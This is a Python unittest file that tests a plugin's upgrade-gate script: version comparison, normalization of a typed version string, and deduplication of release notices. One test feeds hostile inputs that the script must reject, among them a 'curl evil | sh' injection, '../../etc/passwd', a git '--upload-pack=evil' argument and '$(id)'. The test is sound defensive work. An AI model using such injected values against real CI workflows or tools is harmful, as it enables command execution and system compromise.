#!/usr/bin/env python3
"""Black-box tests for scheduling-doc-sync's upgrade-gate.py.

Tests the script as a subprocess: real argv, real exit codes, real stdout.
Run: python3 tests/scripts/upgrade-gate_test.py
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest

SCRIPT = os.path.join(
    os.path.dirname(__file__),
    "..", "..",
    "plugins", "doc-lifecycle", "skills", "scheduling-doc-sync",
    "scripts", "upgrade-gate.py",
)


def run(*argv):
    return subprocess.run(
        [sys.executable, SCRIPT, *argv], capture_output=True, text=True
    )


def compare(current, latest):
    return run("compare", "--current", current, "--latest", latest)


class UpgradeGate(unittest.TestCase):
    def test_newer_patch_is_upgrade(self):
        r = compare("0.7.0", "0.7.1")
        self.assertEqual(r.returncode, 0)
        self.assertEqual(r.stdout.strip(), "upgrade")

    def test_newer_minor_is_upgrade(self):
        self.assertEqual(compare("0.7.0", "0.8.0").stdout.strip(), "upgrade")

    def test_newer_major_is_upgrade(self):
        self.assertEqual(compare("0.7.0", "1.0.0").stdout.strip(), "upgrade")

    def test_equal_is_current(self):
        r = compare("0.7.0", "0.7.0")
        self.assertEqual(r.returncode, 0)
        self.assertEqual(r.stdout.strip(), "current")

    def test_installed_newer_is_ahead(self):
        # a dev/prerelease pin past the newest release — never downgrade
        r = compare("0.8.0", "0.7.0")
        self.assertEqual(r.returncode, 0)
        self.assertEqual(r.stdout.strip(), "ahead")

    def test_patch_downgrade_is_ahead(self):
        self.assertEqual(compare("0.7.2", "0.7.1").stdout.strip(), "ahead")

    def test_compare_is_numeric_not_lexical(self):
        # 0.10.0 > 0.9.0 numerically; lexical string compare would say "ahead"
        self.assertEqual(compare("0.9.0", "0.10.0").stdout.strip(), "upgrade")

    def test_v_prefix_is_tolerated_on_either_side(self):
        # the workflow strips v, but be forgiving if a tag slips through
        self.assertEqual(compare("v0.7.0", "v0.7.1").stdout.strip(), "upgrade")

    def test_empty_latest_is_bad_input(self):
        # a repo with no releases yields an empty tagName
        self.assertEqual(compare("0.7.0", "").returncode, 2)

    def test_empty_current_is_bad_input(self):
        self.assertEqual(compare("", "0.7.0").returncode, 2)

    def test_non_numeric_is_bad_input(self):
        self.assertEqual(compare("0.7.0", "latest").returncode, 2)

    def test_short_tuple_is_bad_input(self):
        self.assertEqual(compare("0.7", "0.7.0").returncode, 2)

    def test_extra_component_is_bad_input(self):
        self.assertEqual(compare("0.7.0.1", "0.7.0").returncode, 2)


class Normalize(unittest.TestCase):
    """The dispatch input's shape check (aj604/toolshed#127).

    A human types the target version into `workflow_dispatch`, and that value
    names a git ref in a `git clone --branch`. It reaches the clone only as this
    subcommand's output, so anything that is not three decimal components has to
    fail here rather than become argv.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.out = os.path.join(self.tmp.name, "github-output.txt")

    def normalize(self, version):
        return run("normalize", "--version", version, "--out", self.out)

    def written(self):
        with open(self.out, encoding="utf-8") as f:
            return f.read()

    def test_it_writes_the_parsed_version_to_the_output_file(self):
        r = self.normalize("0.37.0")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout.strip(), "0.37.0")
        self.assertEqual(self.written(), "target=0.37.0\n")

    def test_it_strips_a_leading_v(self):
        self.assertEqual(self.normalize("v1.2.3").stdout.strip(), "1.2.3")

    def test_it_appends_so_earlier_step_outputs_survive(self):
        with open(self.out, "w", encoding="utf-8") as f:
            f.write("current=0.1.0\n")
        self.normalize("0.2.0")
        self.assertEqual(self.written(), "current=0.1.0\ntarget=0.2.0\n")

    def test_a_ref_expression_is_refused(self):
        for hostile in ("0.37.0; curl evil | sh", "main", "../../etc/passwd",
                        "0.37.0 --upload-pack=evil", "$(id)", ""):
            with self.subTest(hostile=hostile):
                r = self.normalize(hostile)
                self.assertEqual(r.returncode, 2, hostile)
                self.assertFalse(os.path.exists(self.out)
                                 and "target=" in self.written())


class Notice(unittest.TestCase):
    """One open notice per release (aj604/toolshed#127).

    The decision lives here rather than in `render-report.py`, which owns the
    strings: the gate owns every decision this lane makes. The dedupe key is the
    exact title the renderer wrote, read from the file it wrote it to.
    """

    TITLE = "doc-sync: doc-lifecycle 0.8.0 is available"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.out = os.path.join(self.tmp.name, "github-output.txt")

    def notice(self, issues, title=TITLE):
        issues_path = os.path.join(self.tmp.name, "issues.json")
        with open(issues_path, "w", encoding="utf-8") as f:
            json.dump(issues, f)
        title_path = os.path.join(self.tmp.name, "title.txt")
        with open(title_path, "w", encoding="utf-8") as f:
            f.write(title + "\n")
        return run("notice", "--issues", issues_path, "--title", title_path,
                   "--out", self.out)

    def written(self):
        with open(self.out, encoding="utf-8") as f:
            return f.read()

    def test_no_standing_notice_opens_one(self):
        r = self.notice([])
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout.strip(), "open")
        self.assertEqual(self.written(), "notice=open\n")

    def test_a_standing_notice_for_this_release_suppresses_it(self):
        r = self.notice([{"number": 4, "title": self.TITLE}])
        self.assertEqual(r.stdout.strip(), "exists")
        self.assertEqual(self.written(), "notice=exists\n")

    def test_a_notice_for_another_release_does_not_suppress_it(self):
        r = self.notice(
            [{"number": 4, "title": "doc-sync: doc-lifecycle 0.7.9 is available"}])
        self.assertEqual(r.stdout.strip(), "open")

    def test_a_non_array_issue_payload_is_bad_input(self):
        self.assertEqual(self.notice({"issues": []}).returncode, 2)

    def test_an_empty_title_is_bad_input(self):
        # An empty dedupe key would match nothing and re-file every week.
        self.assertEqual(self.notice([], title="").returncode, 2)


if __name__ == "__main__":
    unittest.main(verbosity=2)
